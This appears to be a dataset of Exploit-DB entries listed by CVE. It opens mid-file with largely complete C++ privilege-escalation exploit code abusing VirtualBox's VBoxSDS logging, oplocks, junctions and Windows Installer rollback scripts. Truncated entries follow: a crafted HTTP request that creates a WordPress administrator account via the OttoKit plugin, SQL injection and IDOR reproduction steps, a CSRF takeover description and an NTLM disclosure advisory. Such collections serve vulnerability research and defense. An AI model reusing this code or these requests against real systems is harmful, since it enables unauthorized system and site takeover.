%d\n"", GetLastError()); return FALSE; else printf(""[+] Junction %ls delete!\n"", dir); return TRUE; BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target) { if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, object, target)) { printf(""[+] Symlink %ls -> %ls created!\n"", object, target); return TRUE; else printf(""error :%d\n"", GetLastError()); return FALSE; BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target) { if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH | DDD_REMOVE_DEFINITION | DDD_EXACT_MATCH_ON_REMOVE, object, target)) { printf(""[+] Symlink %ls -> %ls deleted!\n"", object, target); return TRUE; else printf(""error :%d\n"", GetLastError()); return FALSE; void runSDS(int delay) { if (delay == 1) { printf(""[!] sleeping for 2 sec\n""); Sleep(2000); CoInitialize(NULL); LPVOID ppv; CoCreateInstance(__uuidof(CLSID_VBoxSDS), 0, CLSCTX_LOCAL_SERVER, IID_IUnknown, &ppv); CoUninitialize(); BOOL checkSDSLog() { BOOL clear = FALSE; std::wstring vboxDataDir = L""C:\\ProgramData\\VirtualBox\\VBoxSDS.log.*""; HANDLE hFind; WIN32_FIND_DATA data; hFind = FindFirstFile(LPCWSTR(vboxDataDir.c_str()), &data); FindNextFile(hFind, &data); if (hFind != INVALID_HANDLE_VALUE) { do { if (wcswcs(data.cFileName, L""VBoxSDS.log."")) { runSDS(0); else { printf(""[+] Logs have been cleared!\n""); clear = TRUE; } while (FindNextFile(hFind, &data)); FindClose(hFind); return clear; BOOL enumProc(const wchar_t* procName) { PWTS_PROCESS_INFO processes{}; BOOL ok = FALSE; DWORD count; if (WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, NULL, 1, &processes, &count)) { for (DWORD i = 0; i < count; i++) { if (wcswcs(processes[i].pProcessName, procName)) { wprintf(L""[!] Process active: %s with PID %d\n"", processes[i].pProcessName, processes[i].ProcessId); ok = TRUE; break; else { printf(""err: %d\n"", GetLastError()); WTSFreeMemory(processes); return ok; void checkIfExists() { if (enumProc(L""VirtualBoxVM.exe"")) { printf(""[!] You seem to have active VMs running, please stop them before running this to prevent corruption of any saved data of the VMs.\n""); exit(1); if (enumProc(L""VirtualBox.exe"")) { printf(""[!] VirtualBox process active\n""); printf(""[!] Trying to exit virtualbox by postmessage close window\n""); PostMessage(FindWindow(NULL, TEXT(""Oracle VM VirtualBox Manager"")), WM_CLOSE, NULL, NULL); printf(""[!] Letting VBoxSDS exit (wait 12 seconds)\n\n""); Sleep(12000); if (enumProc(L""VBoxSDS.exe"")) { printf(""[-] error stopping vboxsds\n""); exit(1); else { printf(""[+] Success stopping vboxsds!\n""); BOOL clearDataDir() { do { vb11 = CreateFile(L""C:\\ProgramData\\VirtualBox\\VBoxSDS.log.11"", DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_FLAG_OVERLAPPED, NULL); printf(""h: %x %d\n"", vb11, GetLastError()); } while (vb11 == INVALID_HANDLE_VALUE); oplock = FileOpLock::CreateLock(vb11, cb1); if (oplock != NULL) { HANDLE c = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)runSDS, NULL, 0, NULL); oplock->WaitForLock(INFINITE); CloseHandle(c); BOOL isEmpty = FALSE; do { isEmpty = checkSDSLog(); } while (isEmpty == FALSE); if (!RemoveDirectory(L""C:\\ProgramData\\VirtualBox\\VBoxSDS.log"")) { printf(""error removing vboxlog dir\n""); exit(1); return isEmpty; int wmain() { loadapis(); checkIfExists(); clearDataDir(); hFile = getDirectoryHandle(BuildPath(L""C:\\Config.msi""), GENERIC_READ | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN_IF); if (hFile == INVALID_HANDLE_VALUE) printf(""[!] Failed to create C:\\Config.msi directory. Trying to delete it.\n""); install(NULL); hFile = getDirectoryHandle(BuildPath(L""C:\\Config.msi""), GENERIC_READ | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN_IF); if (hFile != INVALID_HANDLE_VALUE) printf(""[+] Successfully removed and recreated C:\\Config.Msi.\n""); else printf(""[!] Failed. Cannot remove c:\\Config.msi""); if (!PathIsDirectoryEmpty(L""C:\\Config.Msi"")) printf(""[!] Failed. C:\\Config.Msi already exists and is not empty.\n""); printf(""[+] Config.msi directory created!\n""); HANDLE hDir = getDirectoryHandle(BuildPath(L""C:\\ProgramData\\VirtualBox""), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN_IF); printf(""hDir: %x\n"", hDir); HANDLE zxc{}; zxc = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Monitor, hDir, 0, NULL); SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS); SetThreadPriorityBoost(GetCurrentThread(), TRUE); // This lets us maintain express control of our priority SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL); oplock = FileOpLock::CreateLock(hFile, callback); if (oplock != nullptr) { oplock->WaitForLock(INFINITE); delete oplock; do { hFile = getDirectoryHandle(BuildPath(L""C:\\Config.msi""), GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN_IF); } while (!hFile); char buff[4096]; DWORD retbt = 0; FILE_NOTIFY_INFORMATION* fn; WCHAR* extension; WCHAR* extension2; do { ReadDirectoryChangesW(hFile, buff, sizeof(buff) - sizeof(WCHAR), TRUE, FILE_NOTIFY_CHANGE_FILE_NAME, &retbt, NULL, NULL); fn = (FILE_NOTIFY_INFORMATION*)buff; size_t sz = fn->FileNameLength / sizeof(WCHAR); fn->FileName[sz] = '\0'; extension = fn->FileName; PathCchFindExtension(extension, MAX_PATH, &extension2); } while (wcscmp(extension2, L"".rbs"") != 0); SetSecurityInfo(hFile, SE_FILE_OBJECT, UNPROTECTED_DACL_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, NULL, NULL, NULL, NULL); while (!Move(hFile)) { HANDLE cfg_h = getDirectoryHandle(BuildPath(L""C:\\Config.msi""), FILE_READ_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_CREATE); WCHAR rbsfile[MAX_PATH]; _swprintf(rbsfile, L""C:\\Config.msi\\%s"", fn->FileName); HANDLE rbs = CreateFile(rbsfile, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); if (WriteFile(rbs, RbsBuff, RbsSize, NULL, NULL)) { printf(""[+] Rollback script overwritten!\n""); else printf(""[!] Failed to overwrite rbs file!\n""); CloseHandle(rbs); CloseHandle(cfg_h); DeleteJunction(dir); CloseHandle(zxc); WCHAR asdfasdf[MAX_PATH]; _swprintf(asdfasdf, L""GLOBAL\\GLOBALROOT\\RPC Control\\%s"", filen); DelDosDeviceSymLink(asdfasdf, L""\\??\\C:\\Config.msi::$INDEX_ALLOCATION""); return 0; DWORD WINAPI install(void*) { HMODULE hm = GetModuleHandle(NULL); HRSRC res = FindResource(hm, MAKEINTRESOURCE(IDR_MSI1), L""msi""); wchar_t msipackage[MAX_PATH] = { 0x0 }; GetTempFileName(L""C:\\windows\\temp\\"", L""MSI"", 0, msipackage); printf(""[*] MSI file: %ls\n"", msipackage); DWORD MsiSize = SizeofResource(hm, res); void* MsiBuff = LoadResource(hm, res); HANDLE pkg = CreateFile(msipackage, GENERIC_WRITE | WRITE_DAC, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); WriteFile(pkg, MsiBuff, MsiSize, NULL, NULL); CloseHandle(pkg); MsiSetInternalUI(INSTALLUILEVEL_NONE, NULL); UINT a = MsiInstallProduct(msipackage, L""ACTION=INSTALL""); printf(""%d\n"", a); MsiInstallProduct(msipackage, L""REMOVE=ALL""); DeleteFile(msipackage); return 0; BOOL Move(HANDLE hFile) { if (hFile == INVALID_HANDLE_VALUE) { printf(""[!] Invalid handle!\n""); return FALSE; wchar_t tmpfile[MAX_PATH] = { 0x0 }; RPC_WSTR str_uuid; UUID uuid = { 0 }; UuidCreate(&uuid); UuidToString(&uuid, &str_uuid); _swprintf(tmpfile, L""\\??\\C:\\windows\\temp\\%s"", str_uuid); size_t buffer_sz = sizeof(FILE_RENAME_INFO) + (wcslen(tmpfile) * sizeof(wchar_t)); FILE_RENAME_INFO* rename_info = (FILE_RENAME_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, buffer_sz); IO_STATUS_BLOCK io = { 0 }; rename_info->ReplaceIfExists = TRUE; rename_info->RootDirectory = NULL; rename_info->Flags = 0x00000001 | 0x00000002 | 0x00000040; rename_info->FileNameLength = wcslen(tmpfile) * sizeof(wchar_t); memcpy(&rename_info->FileName[0], tmpfile, wcslen(tmpfile) * sizeof(wchar_t)); NTSTATUS status = pNtSetInformationFile(hFile, &io, rename_info, buffer_sz, 65); if (status != 0) { return FALSE; return TRUE; void callback() { SetThreadPriority(GetCurrentThread(), REALTIME_PRIORITY_CLASS); Move(hFile); hthread = CreateThread(NULL, NULL, install, NULL, NULL, NULL); HANDLE hd; do { hd = getDirectoryHandle(BuildPath(L""C:\\Config.msi""), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN); } while (!hd); do { CloseHandle(hd); hd = getDirectoryHandle(BuildPath(L""C:\\Config.msi""), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN); } while (hd); CloseHandle(hd); do { hd = getDirectoryHandle(BuildPath(L""C:\\Config.msi""), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN); CloseHandle(hd); } while (retcode != 0xC0000022); HANDLE getDirectoryHandle(LPWSTR file, DWORD access, DWORD share, DWORD dispostion) { UNICODE_STRING ufile; HANDLE hDir; pRtlInitUnicodeString(&ufile, file); OBJECT_ATTRIBUTES oa = { 0 }; IO_STATUS_BLOCK io = { 0 }; InitializeObjectAttributes(&oa, &ufile, OBJ_CASE_INSENSITIVE, NULL, NULL); retcode = pNtCreateFile(&hDir, access, &oa, &io, NULL, FILE_ATTRIBUTE_NORMAL, share, dispostion, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL); if (!NT_SUCCESS(retcode)) { return NULL; return hDir; LPWSTR BuildPath(LPCWSTR path) { wchar_t ntpath[MAX_PATH]; swprintf(ntpath, L""\\??\\%s"", path); return ntpath; void loadapis() { HMODULE ntdll = GetModuleHandle(L""ntdll.dll""); if (ntdll != NULL) { pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(ntdll, ""RtlInitUnicodeString""); pNtCreateFile = (_NtCreateFile)GetProcAddress(ntdll, ""NtCreateFile""); pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(ntdll, ""NtSetInformationFile""); if (pRtlInitUnicodeString == NULL || pNtCreateFile == NULL) { printf(""Cannot load api's %d\n"", GetLastError()); exit(0); void cb0() { if (!Move(h)) { printf(""reached3\n""); exit(1); printf(""reached2\n""); _swprintf(dir, L""C:\\ProgramData\\VirtualBox""); if (!CreateJunction(BuildPath(dir), L""\\RPC Control"")) { printf(""[!] Exiting!\n""); exit(1); WCHAR asdfasdf[MAX_PATH]; _swprintf(asdfasdf, L""GLOBAL\\GLOBALROOT\\RPC Control\\%s"", filen); if (!DosDeviceSymLink(asdfasdf, L""\\??\\C:\\Config.msi::$INDEX_ALLOCATION"")) { printf(""zxc\n""); void cb1() { printf(""[!] oplock triggered\n""); if (!Move(vb11)) { printf(""reached3\n""); exit(1); if (!CreateDirectory(L""C:\\ProgramData\\VirtualBox\\VBoxSDS.log"", NULL)) { printf(""Error creating dir. Exiting\n""); exit(1); return; BOOL Monitor(HANDLE hDir) { printf(""[!] Monitor called\n""); BOOL deleted = FALSE; _swprintf(filen, L""VBoxSDS.log.11""); do { do { h = CreateFile(L""C:\\ProgramData\\VirtualBox\\VBoxSDS.log.11"", DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_FLAG_OVERLAPPED, NULL); printf(""h: %x\n"", h); } while (h == INVALID_HANDLE_VALUE); oplock = FileOpLock::CreateLock(h, cb0); if (oplock != NULL) { HANDLE c = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)runSDS, (LPVOID)1, 0, NULL); oplock->WaitForLock(INFINITE); CloseHandle(c); deleted = TRUE; } while (deleted == FALSE); return deleted;"
CVE-2025-27533,2025-05-09,exploit db,"# Exploit Title: Apache ActiveMQ 6.1.6 - Denial of Service (DOS) # Date: 2025-05-9 # Exploit Author: [Abdualhadi khalifa (https://x.com/absholi7ly/) # Github: https://github.com/absholi7ly/CVE-2025-27533-Exploit-for-Apache-ActiveMQ # CVE: CVE-2025-27533 import socket import struct import time import datetime import threading import requests import argparse import random from colorama import init, Fore from tabulate import tabulate from tqdm import tqdm from concurrent.futures import ThreadPoolExecutor init() def print_banner(): banner = f"""""" {Fore.CYAN}============================================================ CVE-2025-27533 Exploit"
CVE-2025-2011,2025-05-09,exploit db,"# Exploit Title: WordPress Depicter Plugin 3.6.1 - SQL Injection # Google Dork: inurl:/wp-content/plugins/depicter/ # Date: 2025-05-06 # Exploit Author: Andrew Long (datagoboom) # Vendor Homepage: https://wordpress.org/plugins/depicter/ # Software Link: https://downloads.wordpress.org/plugin/depicter.3.6.1.zip # Version: <= 3.6.1 # Tested on: WordPress 6.x # CVE: CVE-2025-2011 # Description: # The Slider & Popup Builder by Depicter plugin for WordPress is vulnerable to SQL Injection via the 's' parameter in all versions up to, and including, 3.6.1. # The vulnerability exists due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. # This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database. # The vulnerability is located in the admin-ajax.php endpoint and can be exploited through the 's' parameter. The"
CVE-2025-27007,2025-05-09,exploit db,"# Exploit Title: SureTriggers OttoKit Plugin 1.0.82 - Privilege Escalation # Date: 2025-05-7 # Exploit Author: [Abdualhadi khalifa (https://x.com/absholi7ly/) # Affected: Versions All versions of OttoKit (SureTriggers) ≤ 1.0.82. Conditions for Exploitation The vulnerability can be exploited under the following circumstances: 1. OttoKit must be installed and activated on the target WordPress site. 2. The plugin *uninitialized* (e.g., no API key or ""secret_key"" is set in the database). 3. The target site displays the REST API endpoint '/wp-json/sure-triggers/v1/automation/action'. HTTP Request The following request targets the /wp-json/sure-triggers/v1/automation/action endpoint to create an administrator account: POST /wp-json/sure-triggers/v1/automation/action HTTP/1.1 Host: [target-site] Content-Type: application/x-www-form-urlencoded St-Authorization: Content-Length: [length] selected_options[user_name]=new_admin&selected_options[user_email]= attacker@example.com&selected_options[password]=StrongP@ssw0rd123 &selected_options[role]=administrator&aintegration=WordPress&type_event=create_user_if_not_exists"
CVE-2025-47226,2025-05-06,exploit db,"# Exploit Title: Grokability Snipe-IT 8.0.4 - Insecure Direct Object Reference (IDOR) # Google Dork: N/A # Date: 2025-05-02 # Exploit Author: Sn1p3r-H4ck3r (Siripong Jintung) # Vendor Homepage: https://snipeitapp.com # Software Link: https://github.com/grokability/snipe-it # Version: <= 8.0.4 # Tested on: Ubuntu 22.04 LTS, Apache2 + MySQL + PHP 8.1 # CVE: CVE-2025-47226 # Vulnerability Description: Snipe-IT <= 8.0.4 contains an Insecure Direct Object Reference (IDOR) vulnerability in the `/locations/ /printassigned` endpoint. This flaw allows an authenticated user from one department to gain access to asset assignment data belonging to other departments by modifying the `location_id` in the URL. # Steps to Reproduce: 1. Authenticate with a low-privileged account assigned to `location_id = 2`. 2. Access the print preview page: https:// /locations/2/printassigned 3. Modify the URL to: https:// /locations/1/printassigned 4. The application will disclose inventory/assignment information for location ID 1, even if the user should not have access. # Impact: - Unauthorized access to internal asset and inventory information. - Potential for lateral data exposure between departments in the same organization. - Disclosure of asset IDs, assignees, and location metadata. # Mitigation: Update to **Snipe-IT v8.1.0** or higher where access control validation has been corrected. # References: - Patch PR: https://github.com/grokability/snipe-it/pull/16672 - CVE Record: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-47226 - Release Notes: https://github.com/grokability/snipe-it/releases/tag/v8.1.0"
CVE-2025-28062,2025-05-06,exploit db,"# Exploit Title: ERPNext 14.82.1 - Account Takeover via Cross-Site Request Forgery (CSRF) # Google Dork: inurl:""/api/method/frappe"" # Date: 2025-04-29 # Exploit Author: Ahmed Thaiban (Thvt0ne) # Vendor Homepage: https://erpnext.com # Software Link: https://github.com/frappe/erpnext # Version: <= 14.82.1, 14.74.3 (Tested) # Tested on: Linux (Ubuntu 20.04), Chrome, Firefox. # CVE : CVE-2025-28062 # Category: WebApps # Description: A Cross-Site Request Forgery (CSRF) vulnerability Lead to Account Takeover exists in ERPNext 14.82.1 and 14.74.3. This flaw allows an attacker to perform unauthorized state-changing operations on behalf of a logged-in administrator without their knowledge or consent. Affected endpoints include: - /api/method/frappe.desk.reportview.delete_items - /api/method/frappe.desk.form.save.savedocs Impact: - Deletion of arbitrary users - Unauthorized role assignment - Account takeover via password change The application fails to enforce CSRF tokens on administrative API requests, violating OWASP recommendations."
CVE-2025-24054,2025-05-01,exploit db,"# Exploit title: Microsoft - NTLM Hash Disclosure Spoofing (library-ms) # Exploit Author: John Page (aka hyp3rlinx) # x.com/hyp3rlinx # ISR: ApparitionSec Back in 2018, I reported a "".library-ms"" File NTLM information disclosure vulnerability to MSRC and was told ""it was not severe enough"", that being said I post it anyways. Seven years passed, until other researchers re-reported it. Subsequently this security flaw was finally deemed important by Microsoft and it received CVE-2025-24054, for which I was finally retroactively credited as the original reporter. Circa 2025 updated: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24054 [References] https://web.archive.org/web/20190106181024/https://hyp3rlinx.altervista.org/advisories/MICROSOFT-WINDOWS-.LIBRARY-MS-FILETYPE-INFORMATION-DISCLOSURE.txt https://packetstorm.news/files/id/148556/ https://cxsecurity.com/issue/WLB-2018070160 [Network Access] Remote [Original Disclosure Timeline] Vendor Notification: Jun 29, 2018 MSRC Response: Jul 12, 2018 ""risk is not severe enough to justify immediate servicing."" July 14, 2018 : Public Disclosure [+] Disclaimer The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere. All content copyright (c). hyp3rlinx"
